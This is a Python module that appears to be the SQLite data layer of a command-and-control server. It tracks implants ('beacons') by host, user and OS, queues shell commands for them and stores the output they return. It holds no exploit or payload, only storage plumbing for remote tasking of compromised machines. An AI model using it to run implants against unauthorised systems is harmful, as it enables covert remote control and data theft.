"""
db/models.py: SQLite schema and all database access functions.

Tables:
  beacons  — one row per implant that has ever checked in
  tasks    — commands queued for a beacon
  results  — output returned by a beacon after executing a task
"""

import sqlite3
import uuid
import time
from contextlib import contextmanager

import config

@contextmanager
def get_conn():
    conn = sqlite3.connect(config.DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


# ==================== Schema ====================

SCHEMA = """
CREATE TABLE IF NOT EXISTS beacons (
    uuid        TEXT PRIMARY KEY,
    hostname    TEXT NOT NULL,
    username    TEXT NOT NULL,
    os          TEXT NOT NULL,
    arch        TEXT NOT NULL,
    pid         INTEGER NOT NULL,
    sleep       INTEGER NOT NULL DEFAULT 60,
    jitter      INTEGER NOT NULL DEFAULT 10,
    first_seen  REAL NOT NULL,   -- unix timestamp
    last_seen   REAL NOT NULL,   -- unix timestamp
    status      TEXT NOT NULL DEFAULT 'alive'  -- alive | dead
);

CREATE TABLE IF NOT EXISTS tasks (
    task_id     TEXT PRIMARY KEY,
    beacon_uuid TEXT NOT NULL REFERENCES beacons(uuid),
    type        TEXT NOT NULL,   -- 'shell'
    payload     TEXT NOT NULL,   -- JSON string
    created_at  REAL NOT NULL,
    status      TEXT NOT NULL DEFAULT 'pending'  -- pending | sent | done | error
);

CREATE TABLE IF NOT EXISTS results (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id     TEXT NOT NULL REFERENCES tasks(task_id),
    beacon_uuid TEXT NOT NULL REFERENCES beacons(uuid),
    exit_code   INTEGER,
    stdout      TEXT,
    stderr      TEXT,
    exec_time_ms INTEGER,
    received_at REAL NOT NULL
);
"""


def init_db():
    """Create tables if they don't exist. Call once on startup."""
    with get_conn() as conn:
        conn.executescript(SCHEMA)


# ==================== Beacon operations ====================

def upsert_beacon(data: dict):
    """Register a new beacon or update last_seen for an existing one."""
    now = time.time()
    with get_conn() as conn:
        existing = conn.execute(
            "SELECT uuid FROM beacons WHERE uuid = ?", (data["uuid"],)
        ).fetchone()

        if existing:
            conn.execute(
                """UPDATE beacons
                   SET hostname=?, username=?, os=?, arch=?, pid=?,
                       sleep=?, jitter=?, last_seen=?, status='alive'
                   WHERE uuid=?""",
                (
                    data["hostname"], data["username"], data["os"],
                    data["arch"], data["pid"],
                    data.get("sleep", 60), data.get("jitter", 10),
                    now, data["uuid"],
                ),
            )
            return False  # existing beacon
        else:
            conn.execute(
                """INSERT INTO beacons
                   (uuid, hostname, username, os, arch, pid, sleep, jitter, first_seen, last_seen)
                   VALUES (?,?,?,?,?,?,?,?,?,?)""",
                (
                    data["uuid"], data["hostname"], data["username"],
                    data["os"], data["arch"], data["pid"],
                    data.get("sleep", 60), data.get("jitter", 10),
                    now, now,
                ),
            )
            return True  # new beacon


def get_all_beacons() -> list[dict]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM beacons ORDER BY last_seen DESC"
        ).fetchall()
        return [dict(r) for r in rows]


def get_beacon(uuid: str) -> dict | None:
    with get_conn() as conn:
        row = conn.execute(
            "SELECT * FROM beacons WHERE uuid=?", (uuid,)
        ).fetchone()
        return dict(row) if row else None


def mark_dead_beacons():
    """Mark beacons that haven't checked in recently as dead."""
    cutoff = time.time() - config.BEACON_TIMEOUT
    with get_conn() as conn:
        conn.execute(
            "UPDATE beacons SET status='dead' WHERE last_seen < ? AND status='alive'",
            (cutoff,),
        )


# ==================== Task operations ====================

def create_task(beacon_uuid: str, task_type: str, payload: dict) -> str:
    """Queue a new task for a beacon. Returns the new task_id."""
    import json
    task_id = uuid.uuid4().hex[:8]
    with get_conn() as conn:
        conn.execute(
            """INSERT INTO tasks (task_id, beacon_uuid, type, payload, created_at)
               VALUES (?,?,?,?,?)""",
            (task_id, beacon_uuid, task_type, json.dumps(payload), time.time()),
        )
    return task_id


def get_pending_tasks(beacon_uuid: str) -> list[dict]:
    """Return all pending tasks for a beacon and mark them as sent."""
    import json
    with get_conn() as conn:
        rows = conn.execute(
            """SELECT * FROM tasks
               WHERE beacon_uuid=? AND status='pending'
               ORDER BY created_at ASC""",
            (beacon_uuid,),
        ).fetchall()

        tasks = []
        for r in rows:
            conn.execute(
                "UPDATE tasks SET status='sent' WHERE task_id=?", (r["task_id"],)
            )
            t = dict(r)
            t["payload"] = json.loads(t["payload"])
            tasks.append(t)
        return tasks


def get_all_tasks(beacon_uuid: str | None = None) -> list[dict]:
    import json
    with get_conn() as conn:
        if beacon_uuid:
            rows = conn.execute(
                "SELECT * FROM tasks WHERE beacon_uuid=? ORDER BY created_at DESC",
                (beacon_uuid,),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM tasks ORDER BY created_at DESC"
            ).fetchall()
        result = []
        for r in rows:
            t = dict(r)
            t["payload"] = json.loads(t["payload"])
            result.append(t)
        return result


# ==================== Result operations ====================

def store_result(beacon_uuid: str, data: dict):
    """Save task output submitted by a beacon."""
    with get_conn() as conn:
        conn.execute(
            """INSERT INTO results
               (task_id, beacon_uuid, exit_code, stdout, stderr, exec_time_ms, received_at)
               VALUES (?,?,?,?,?,?,?)""",
            (
                data["task_id"], beacon_uuid,
                data.get("exit_code"), data.get("stdout", ""),
                data.get("stderr", ""), data.get("exec_time_ms"),
                time.time(),
            ),
        )
        conn.execute(
            "UPDATE tasks SET status=? WHERE task_id=?",
            ("error" if data.get("exit_code", 0) != 0 else "done", data["task_id"]),
        )


def get_results(task_id: str) -> list[dict]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM results WHERE task_id=? ORDER BY received_at DESC",
            (task_id,),
        ).fetchall()
        return [dict(r) for r in rows]


def get_recent_results(beacon_uuid: str, limit: int = 20) -> list[dict]:
    with get_conn() as conn:
        rows = conn.execute(
            """SELECT r.*, t.type, t.payload FROM results r
               JOIN tasks t ON r.task_id = t.task_id
               WHERE r.beacon_uuid=?
               ORDER BY r.received_at DESC LIMIT ?""",
            (beacon_uuid, limit),
        ).fetchall()
        return [dict(r) for r in rows]
